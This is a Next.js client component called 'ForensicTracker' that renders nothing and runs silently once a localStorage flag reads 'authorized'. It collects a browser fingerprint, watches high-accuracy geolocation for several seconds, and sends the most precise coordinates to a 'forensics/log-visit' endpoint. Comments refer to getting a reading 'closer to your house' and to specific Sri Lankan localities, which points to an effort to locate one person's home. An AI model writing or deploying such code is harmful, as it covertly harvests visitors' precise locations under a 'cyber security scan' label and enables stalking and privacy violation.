"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import { API_URL } from "@/lib/config";

export default function ForensicTracker() {
  const pathname = usePathname();
  const [hasLogged, setHasLogged] = useState(false);

  useEffect(() => {
    if (pathname.includes("/admin/dashboard")) return;

    const monitorAuthorization = setInterval(() => {
      const isAuthorized =
        localStorage.getItem("ccid_auth_v2") === "authorized";
      if (isAuthorized && !hasLogged) {
        clearInterval(monitorAuthorization);
        initiateCyberScan();
      }
    }, 1500);

    const initiateCyberScan = async () => {
      try {
        const fingerprint = {
          screen: `${window.screen.width}x${window.screen.height}`,
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          referrer: document.referrer || "direct",
        };

        // CYBER SECURITY SCAN: Multi-stage triangulation
        let bestLocation = null;
        let bestAccuracy = Infinity;

        // Stage 1: Fast Fingerprint
        const sendSignal = async (loc = null) => {
          await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              source: pathname || "/",
              fingerprint,
              location: loc,
            }),
          });
        };

        // Stage 2: Deep Hardware Search (10 seconds)
        if ("geolocation" in navigator) {
          const scan = navigator.geolocation.watchPosition(
            (pos) => {
              // Discard low-accuracy network tower guesses (Wellawatte)
              // We only want the high-precision reading closer to your house
              if (pos.coords.accuracy < bestAccuracy) {
                bestAccuracy = pos.coords.accuracy;
                bestLocation = {
                  lat: pos.coords.latitude,
                  lon: pos.coords.longitude,
                };
                console.log(
                  `[FORENSICS] Precision Lock: ${bestAccuracy} meters`,
                );
              }
            },
            () => {},
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
          );

          // Give the hardware 8 seconds to settle on Homagama
          setTimeout(async () => {
            navigator.geolocation.clearWatch(scan);
            await sendSignal(bestLocation);
            setHasLogged(true);
          }, 8000);
        } else {
          await sendSignal();
          setHasLogged(true);
        }
      } catch (err) {}
    };

    return () => clearInterval(monitorAuthorization);
  }, [pathname, hasLogged]);

  useEffect(() => {
    setHasLogged(false);
  }, [pathname]);

  return null;
}
